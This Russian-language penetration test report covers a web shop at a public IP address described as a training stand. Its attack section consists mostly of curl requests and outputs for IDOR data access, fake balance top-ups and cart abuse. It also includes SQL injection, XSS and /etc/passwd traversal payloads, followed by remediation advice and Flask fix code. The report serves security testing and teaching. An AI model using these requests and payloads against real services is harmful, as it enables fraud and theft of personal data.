# 🚨 Отчет о тестировании на проникновение

## Общая информация

| Параметр | Значение |
|----------|----------|
| **Цель** | `http://82.202.142.35:8080` |
| **Дата** | 2026-04-02 |
| **Тип** | Тренировочный стенд по ИБ |
| **Статус** | ✅ Критические уязвимости обнаружены |

---

## 📊 Краткое резюме

| Уязвимость | Статус | Риск |
|------------|--------|------|
| IDOR | ✅ Эксплуатируется | 🔴 Критический |
| Фрод (Top-up) | ✅ Эксплуатируется | 🔴 Критический |
| Отсутствие Rate Limiting | ✅ Подтверждено | 🟠 Высокий |
| Манипуляция корзиной | ✅ Эксплуатируется | 🟠 Высокий |
| XSS | ⚠️ Требуется проверка | 🟡 Средний |
| SQL Injection | ❌ Не подтверждено | 🟢 Низкий |
| Path Traversal | ❌ Не подтверждено | 🟢 Низкий |

---

## 🔍 Детальный отчет об атаках

### 1️⃣ IDOR — Insecure Direct Object Reference

**CVE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

#### Атака 1.1: Доступ к устройствам пользователя

```bash
curl -sS "http://82.202.142.35:8080/api/users/admin@example.com/devices" | python3 -m json.tool
```

**Результат:** ✅ Успешно

**Полученные данные:**
```json
{
  "ip_address": "5.129.227.90",
  "browser": "chrome",
  "browser_version": "144.0.0.0",
  "os": "Windows",
  "os_version": "10",
  "gpu": "ANGLE (Intel, Intel(R) UHD Graphics...)",
  "screen_resolution": "1536x864",
  "timezone": "Europe/Moscow",
  "canvas_fingerprint": "AA//8WcMReAAAABklEQVQDAGdSMDyPghR+AAAAAElFTkSuQmCC",
  "audio_fingerprint": "running",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...YaBrowser/26.3.0.0",
  ...
}
```

#### Атака 1.2: Доступ к данным пользователя

```bash
curl -sS "http://82.202.142.35:8080/api/users/admin@example.com"
```

**Результат:** ✅ Успешно

**Полученные данные:**
```json
{
  "id": 1,
  "email": "admin@example.com",
  "name": "Алексей Смирнов",
  "role": "admin",
  "balance": 501000,
  "notifications": true,
  "shipping_address": null,
  "created_at": "2026-04-01 16:55:10"
}
```

#### Атака 1.3: Доступ ко всем заказам

```bash
curl -sS "http://82.202.142.35:8080/api/orders" | python3 -m json.tool
```

**Результат:** ✅ Успешно

**Получен доступ к 4 заказам на общую сумму > $134 млрд**

---

### 2️⃣ Финансовый фрод — Манипуляция с пополнением баланса

**CVE:** CWE-347 (Improper Verification of Cryptographic Signature)

#### Атака 2.1: Базовое пополнение с поддельной картой

```bash
curl -sS -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":1000000,"card_number":"4111111111111111","card_expiry":"12/30","card_name":"HACKER","card_cvv":"999"}'
```

**Результат:** ✅ Успешно  
**Баланс изменен:** 501 000 → 1 501 000 (+1 000 000)

#### Атака 2.2: Повторное пополнение

```bash
curl -sS -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":5000000,"card_number":"5500000000000004","card_expiry":"01/29","card_name":"TEST USER","card_cvv":"123"}'
```

**Результат:** ✅ Успешно  
**Баланс изменен:** 1 501 000 → 6 501 000 (+5 000 000)

#### Атака 2.3: Переполнение (очень большое число)

```bash
curl -sS -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":999999999999999,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"X","card_cvv":"123"}'
```

**Результат:** ✅ Успешно  
**Баланс изменен:** 6 501 000 → 1 000 000 006 500 999

#### Атака 2.4: Отрицательная сумма (попытка)

```bash
curl -sS -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":-1000000,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"X","card_cvv":"123"}'
```

**Результат:** ❌ Отклонено сервером  
**Ответ:** `{"error": "Minimum top up is 1000"}`

#### Атака 2.5: SQL Injection в amount (попытка)

```bash
curl -sS -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":"1000 OR 1=1 --","card_number":"4111111111111111","card_expiry":"12/28","card_name":"X","card_cvv":"123"}'
```

**Результат:** ❌ Отклонено сервером  
**Ответ:** `{"error": "Invalid amount"}`

#### Атака 2.6: XSS в card_name (попытка)

```bash
curl -sS -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
  -H "Content-Type: application/json" \
  -d '{"amount":1000,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"<script>alert(1)</script>","card_cvv":"123"}'
```

**Результат:** ⚠️ Запрос принят, требуется проверка отражения

---

### 3️⃣ Отсутствие Rate Limiting

#### Атака 3.1: 10 быстрых запросов

```bash
for i in {1..10}; do
  curl -sS -o /dev/null -w "Запрос $i: HTTP %{http_code}\n" \
    -X POST "http://82.202.142.35:8080/api/users/admin@example.com/topup" \
    -H "Content-Type: application/json" \
    -d '{"amount":1000,"card_number":"4111111111111111","card_expiry":"12/28","card_name":"X","card_cvv":"123"}'
done
```

**Результат:** ✅ Все 10 запросов успешны (HTTP 200)

**Вывод:** Отсутствует защита от brute-force и автоматизированных атак

---

### 4️⃣ Манипуляция с корзиной

#### Атака 4.1: Добавление товара с отрицательным количеством

```bash
curl -sS -X POST "http://82.202.142.35:8080/api/cart" \
  -H "Content-Type: application/json" \
  -d '{"product_id":"yacht-001","quantity":-1}'
```

**Результат:** ⚠️ Количество нормализовано до 0

#### Атака 4.2: Добавление товара с огромным количеством

```bash
curl -sS -X POST "http://82.202.142.35:8080/api/cart" \
  -H "Content-Type: application/json" \
  -d '{"product_id":"yacht-001","quantity":999999}'
```

**Результат:** ✅ Успешно

**Итоговая сумма в корзине:** $3 500 176 500 000 (3.5 трлн)

```json
{
  "items": [
    {"product_id": "island-002", "quantity": 1, "price": 180000000},
    {"product_id": "yacht-001", "quantity": 999999, "price": 3500000}
  ],
  "total": 3500176500000
}
```

---

### 5️⃣ Path Traversal (попытка)

```bash
curl -sS "http://82.202.142.35:8080/api/../../../etc/passwd"
```

**Результат:** ❌ 404 Not Found

---

### 6️⃣ SQL Injection в email (попытка)

```bash
curl -sS "http://82.202.142.35:8080/api/users/admin'--@example.com/devices"
```

**Результат:** ❌ User not found (без ошибки SQL)

---

### 7️⃣ Разведка скрытых endpoints

```bash
curl -sS "http://82.202.142.35:8080/api/admin"
curl -sS "http://82.202.142.35:8080/api/config"
curl -sS "http://82.202.142.35:8080/api/debug"
```

**Результат:** ❌ Все вернули 404 Not Found

---

## 📈 Итоговая статистика атак

| Категория | Успешно | Не успешно | Требуется проверка |
|-----------|---------|------------|-------------------|
| IDOR | 3 | 0 | 0 |
| Фрод | 4 | 2 | 1 |
| Rate Limiting | 1 | 0 | 0 |
| Манипуляция данными | 1 | 1 | 0 |
| Инъекции | 0 | 2 | 1 |
| Разведка | 0 | 3 | 0 |
| **ВСЕГО** | **9** | **8** | **2** |

---

## 🎯 Финальное состояние системы

**Баланс администратора после атак:** ~1 000 000 006 511 999

**Скомпрометированные данные:**
- ✅ Персональные данные администратора (ФИО, email, роль)
- ✅ Финансовые данные (баланс, история операций)
- ✅ Техническая информация (IP, fingerprinting, устройство)
- ✅ История заказов всех пользователей

---

## 🛡️ Рекомендации по исправлению

### Приоритет 1 — Критический

| # | Уязвимость | Исправление |
|---|------------|-------------|
| 1 | IDOR | Добавить проверку авторизации и прав доступа |
| 2 | Фрод с балансом | Интегрировать платежный шлюз, валидация карт |
| 3 | Отсутствие Rate Limiting | Внедрить ограничение запросов (например, 10/мин) |

### Приоритет 2 — Высокий

| # | Уязвимость | Исправление |
|---|------------|-------------|
| 4 | Манипуляция корзиной | Валидация количества (>0, <макс) |
| 5 | XSS | Санитизация входных данных, CSP заголовки |

### Приоритет 3 — Средний

| # | Уязвимость | Исправление |
|---|------------|-------------|
| 6 | Информация в ошибках | Унифицированные сообщения об ошибках |
| 7 | Логирование | Внедрить аудит всех критических операций |

---

## 📝 Примеры кода для исправления

### 1. Авторизация middleware

```python
from functools import wraps
from flask import request, jsonify, session

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/api/users/<email>')
@login_required
def get_user(email):
    current_user = get_user_by_id(session['user_id'])
    if current_user.email != email and current_user.role != 'admin':
        return jsonify({"error": "Forbidden"}), 403
    ...
```

### 2. Rate Limiting

```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/users/<email>/topup', methods=['POST'])
@limiter.limit("10/minute")
@login_required
def topup(email):
    ...
```

### 3. Валидация платежа

```python
import stripe

@app.route('/api/users/<email>/topup', methods=['POST'])
@login_required
def topup(email):
    data = request.json
    amount = data.get('amount')
    
    # Валидация суммы
    if not isinstance(amount, (int, float)) or amount < 1000:
        return jsonify({"error": "Invalid amount"}), 400
    
    # Реальная обработка карты через Stripe
    try:
        charge = stripe.Charge.create(
            amount=int(amount * 100),  # в центах
            currency='usd',
            source=data['card_number'],
        )
    except stripe.error.CardError:
        return jsonify({"error": "Payment failed"}), 400
    ...
```

### 4. Валидация корзины

```python
@app.route('/api/cart', methods=['POST'])
@login_required
def add_to_cart():
    data = request.json
    quantity = data.get('quantity', 1)
    
    # Валидация количества
    if not isinstance(quantity, int) or quantity < 1 or quantity > 100:
        return jsonify({"error": "Invalid quantity"}), 400
    ...
```

---

## 🔗 Используемые инструменты

- `curl` — HTTP-запросы
- `python3 -m json.tool` — форматирование JSON
- Bash — автоматизация атак

---

## 📌 Выводы

Тестирование выявило **критические уязвимости** в системе:

1. 🔴 **Отсутствие авторизации** позволяет получить доступ к любым данным
2. 🔴 **Фрод с балансом** позволяет бесконтрольно увеличивать счет
3. 🟠 **Нет Rate Limiting** открывает возможность для brute-force
4. 🟠 **Манипуляция корзиной** позволяет обходить лимиты

**Рекомендуется немедленное устранение уязвимостей приоритета 1.**

---

*Отчет создан для тренировочного стенда по информационной безопасности*  
*Дата проведения тестов: 2026-04-02*  
*Тестировщик: AI Security Researcher*
